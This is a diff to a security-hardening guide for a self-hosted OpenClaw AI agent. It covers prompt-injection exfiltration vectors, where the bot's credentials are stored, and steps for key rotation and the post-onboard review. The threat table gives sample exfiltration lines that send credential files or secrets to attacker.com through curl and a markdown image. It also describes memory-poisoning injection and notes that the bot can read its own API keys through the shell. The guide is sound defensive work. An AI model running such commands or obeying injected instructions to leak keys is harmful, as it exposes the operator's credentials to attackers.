@@ -1976,7 +1976,7 @@ Even if prompt injection succeeds, data can only leave the VPS through available
 
 | Vector | How It Works | Defense |
 |--------|-------------|---------|
-| **Shell execution** | `curl https://attacker.com/exfil?data=$(cat /etc/openclaw/env)` | Egress firewall (§5), auditd logging (§7), systemd sandbox (§1) |
+| **Shell execution** | `curl https://attacker.com/exfil?data=$(cat ~/.openclaw/agents/main/agent/auth-profiles.json)` or `cat /etc/openclaw/env` | Egress firewall (§5), auditd logging (§7), systemd sandbox (§1), `logging.redactPatterns` |
 | **Web fetch tool** | Bot uses `web_fetch` to send data as a URL parameter | Log all web_fetch calls, system prompt instruction against data-in-URLs |
 | **Markdown image** | Bot outputs `![](https://attacker.com/img?data=SECRET)` — if rendered in a client that fetches images, data is exfiltrated | Telegram doesn't auto-fetch markdown image URLs in bot messages — but the Control UI might |
 | **Memory persistence** | Attacker injects instructions into memory DB, which resurface in future conversations | Memory search minScore threshold (0.35), temporal decay, periodic memory audit |
@@ -2189,19 +2189,37 @@ These incidents demonstrate why version pinning and audit scanning are essential
 
 ### 16.1 Current Credential Storage
 
-| Credential | Location | Permissions | Risk Level | Access |
-|-----------|----------|-------------|------------|--------|
-| Anthropic API key | `/etc/openclaw/env` | root:root 0600 | Critical | Injected via systemd `EnvironmentFile` |
-| Gateway auth token | `~/.openclaw/openclaw.json` | openclaw:openclaw 0600 | High | Read by OpenClaw process |
-| Telegram bot token | `~/.openclaw/openclaw.json` | openclaw:openclaw 0600 | High | Read by OpenClaw process |
-| Auth profiles (API keys, OAuth) | `~/.openclaw/agents/<id>/auth-profiles.json` | openclaw:openclaw 0600 | Critical | Per-agent provider credentials |
+**OpenClaw's credential resolution order** (from [official docs](https://docs.openclaw.ai/gateway/authentication), highest priority first):
+
+1. `OPENCLAW_LIVE_<PROVIDER>_KEY` — single override env var
+2. `<PROVIDER>_API_KEYS` — plural env var
+3. `<PROVIDER>_API_KEY` — singular env var (e.g., `ANTHROPIC_API_KEY`)
+4. Per-agent auth profiles (`auth-profiles.json`)
+5. `~/.openclaw/.env` — global fallback
+
+**Environment variables take precedence over config files.** This is critical for our hardening strategy.
+
+**Actual credential locations on our VPS (verified 2026-02-24):**
+
+| Credential | Primary Location | Permissions | Risk | Notes |
+|-----------|-----------------|-------------|------|-------|
+| Anthropic API key | `~/.openclaw/agents/main/agent/auth-profiles.json` | openclaw:openclaw 0600 | Critical | Set by `openclaw onboard`. Bot can read via shell. |
+| Anthropic API key (hardened) | `/etc/openclaw/env` as `ANTHROPIC_API_KEY` | root:root 0600 | Critical | **Recommended.** Injected via systemd `EnvironmentFile`. Takes precedence over auth-profiles.json. Must be added manually after onboard. |
+| OAuth/setup token | `~/.openclaw/agents/main/agent/auth-profiles.json` | openclaw:openclaw 0600 | High | Profile `anthropic:claude-max-claw`. Legacy from initial setup. |
+| Auth runtime cache | `~/.openclaw/agents/main/agent/auth.json` | openclaw:openclaw 0600 | High | Managed automatically by OpenClaw — do not edit ([official docs](https://docs.openclaw.ai/concepts/oauth)). |
+| Gateway auth token | `~/.openclaw/openclaw.json` | openclaw:openclaw 0600 | High | `gateway.auth.token` field |
+| Telegram bot token | `~/.openclaw/openclaw.json` | openclaw:openclaw 0600 | High | `channels.telegram.botToken` field. Also in `/etc/openclaw/env` for systemd. |
 | Channel credentials | `~/.openclaw/credentials/**` | openclaw:openclaw 0600 | Critical | Pairing tokens, allowlists |
 | Session transcripts | `~/.openclaw/agents/<id>/sessions/*.jsonl` | openclaw:openclaw 0600 | High | Messages, tool output, context |
 | Memory DB | `~/.openclaw/memory/main.sqlite` | openclaw:openclaw 0700 (dir) | High | Read/write by OpenClaw |
 | Sandbox workspace | `~/.openclaw/sandboxes/**` | openclaw:openclaw 0700 (dir) | Medium | Tool workspace files |
 | Lattice identity | `~/.openclaw/workspace/lattice/identity.json` | openclaw:openclaw 0600 | High | Lattice private key (plaintext) |
 
-**Treat everything under `~/.openclaw/` as sensitive.** The `openclaw doctor` command (§10.8) audits these permissions and can auto-fix common issues. Run it after any manual changes.
+**The onboard wizard vs. our hardening:**
+
+The `openclaw onboard` wizard stores the API key in `auth-profiles.json` (user-owned), not in our root-owned env file. This is by design — the wizard runs as the `openclaw` user and cannot write to `/etc/openclaw/env`. After every onboard run, you must manually copy the API key to `/etc/openclaw/env` and verify that the env var takes precedence at runtime (see §16.5 Post-Onboard Security Review).
+
+**Treat everything under `~/.openclaw/` as sensitive.** The bot can read all files in its home directory via shell (`exec.security: "full"`). The `openclaw doctor` command (§10.8) audits permissions and can auto-fix common issues.
 
 ### 16.2 API Key Best Practices
 
@@ -2212,17 +2230,21 @@ These incidents demonstrate why version pinning and audit scanning are essential
 - Keep separate keys for development and production
 
 **Additional hardening for VPS deployment:**
-- API key in `/etc/openclaw/env` (root-owned, 0600) — only readable by the systemd service via `EnvironmentFile`
-- The `openclaw` user process has the key in its environment, but cannot read the file directly
+- API key in `/etc/openclaw/env` (root-owned, 0600) — env var takes precedence over auth-profiles.json per official docs
+- The `openclaw` user process has the key in its environment, but cannot read the env file directly
+- **Important:** The API key also exists in `auth-profiles.json` (user-owned, 0600). The bot CAN read this file via shell. The env file approach adds defense in depth but does not fully prevent key extraction — the key is also readable from `/proc/self/environ` by the process itself.
 - auditd monitors file access to `/etc/openclaw/env` (Part I §7)
 - System prompt instructs the bot to never output API keys or credentials
+- `logging.redactPatterns` in `openclaw.json` redacts `sk-ant-*` patterns from tool output
 
 **Key rotation:**
 1. Generate new key in Anthropic Console
-2. Update `/etc/openclaw/env` on VPS
-3. `sudo systemctl restart openclaw`
-4. Delete old key in Anthropic Console
-5. Monitor for any failed authentication in logs
+2. Update `/etc/openclaw/env` on VPS: `sudo vim /etc/openclaw/env`
+3. Update auth-profiles.json: `openclaw onboard --non-interactive --accept-risk --auth-choice apiKey --anthropic-api-key "NEW_KEY"`
+4. `sudo systemctl restart openclaw`
+5. Delete old key in Anthropic Console
+6. Run post-onboard security review (§16.5)
+7. Monitor for any failed authentication in logs
 
 ### 16.3 Secret Rotation Checklist
 
@@ -2236,7 +2258,7 @@ These incidents demonstrate why version pinning and audit scanning are essential
 
 | Credential | How to Rotate | Where |
 |-----------|--------------|-------|
-| Anthropic API key | Anthropic Console → delete old → generate new → update `/etc/openclaw/env` | console.anthropic.com/settings/keys |
+| Anthropic API key | Anthropic Console → delete old → generate new → update `/etc/openclaw/env` AND run `openclaw onboard` → post-onboard review (§16.5) | console.anthropic.com/settings/keys |
 | Gateway auth token | Generate new random token → update `gateway.auth.token` in `openclaw.json` | Config file |
 | Telegram bot token | BotFather → `/revoke` → `/token` → update `channels.telegram.botToken` | BotFather + config file |
 | Remote client secrets | Update `gateway.remote.token`/`.password` on ALL remote client machines | Remote configs |
@@ -2272,6 +2294,67 @@ As of February 2026, Anthropic does not offer scoped API keys (keys limited to s
 - Separate keys for different agent contexts
 
 Monitor Anthropic's API documentation for this feature.
+
+### 16.5 Post-Onboard Security Review
+
+**Run this checklist after every `openclaw onboard` execution.** The onboard wizard overwrites `openclaw.json` and may reset security settings. It also stores API keys in user-readable files rather than our root-owned env file.
+
+**Why this exists:** The onboard wizard is designed for ease of setup, not for hardened deployments. It stores credentials in `auth-profiles.json` (readable by the bot via shell), may update model versions, add config fields, or change streaming behavior. Our security posture depends on settings that onboard doesn't know about (tool deny list, exec policy, gateway bind mode).
+
+**Checklist:**
+
+```bash
+# 1. Diff the config against the backup
+diff ~/.openclaw/openclaw.json.bak ~/.openclaw/openclaw.json
+
+# 2. Verify tool deny list is intact
+python3 -c 'import json; c=json.load(open("/home/openclaw/.openclaw/openclaw.json")); print("deny:", c["tools"]["deny"])'
+# Expected: ['gateway', 'nodes', 'sessions_spawn', 'sessions_send']
+
+# 3. Verify exec policy unchanged
+python3 -c 'import json; c=json.load(open("/home/openclaw/.openclaw/openclaw.json")); print("exec:", c["tools"]["exec"])'
+# Expected: {'security': 'full', 'ask': 'off'}
+
+# 4. Verify gateway is still loopback-only
+python3 -c 'import json; c=json.load(open("/home/openclaw/.openclaw/openclaw.json")); print("bind:", c["gateway"]["bind"])'
+# Expected: loopback
+
+# 5. Migrate API key to env file (if not already there)
+# Check current env file:
+sudo cat /etc/openclaw/env | grep ANTHROPIC
+# If missing, add the key from auth-profiles.json:
+# sudo vim /etc/openclaw/env  →  ANTHROPIC_API_KEY=sk-ant-...
+# sudo chmod 600 /etc/openclaw/env
+
+# 6. Verify file permissions
+stat -c '%a %U:%G %n' ~/.openclaw/openclaw.json
+# Expected: 600 openclaw:openclaw
+stat -c '%a %n' ~/.openclaw/agents/main/agent/auth-profiles.json
+# Expected: 600
+stat -c '%a %n' ~/.openclaw/pipeline/inbox ~/.openclaw/pipeline/outbox ~/.openclaw/pipeline/ack
+# Expected: 700 each
+
+# 7. Fix backup permissions (onboard sets 444 — world-readable)
+chmod 600 ~/.openclaw/openclaw.json.bak
+
+# 8. Check for unsafe content flags
+grep -r "allowUnsafeExternalContent" ~/.openclaw/
+
+# 9. Run OpenClaw diagnostics
+export PATH="$HOME/.npm-global/bin:$PATH"
+openclaw doctor
+```
+
+**What onboard typically changes** (observed 2026-02-24):
+- `meta.lastTouchedVersion` and `meta.lastTouchedAt` — version/timestamp update
+- `auth.profiles` — adds/updates provider auth profile references
+- `agents.defaults.model.primary` — may update to latest model version
+- `channels.*.streaming` — may change streaming behavior
+- `commands.restart`, `commands.ownerDisplay` — adds convenience fields
+- `agents.defaults.workspace` — sets explicit workspace path
+- Creates `openclaw.json.bak` with 444 permissions (world-readable)
+
+**What onboard preserves** (verified): `tools.deny`, `tools.profile`, `tools.exec`, `gateway.bind`, `gateway.auth`, `channels.*.enabled`, memory settings, heartbeat config.
 
 ---
 
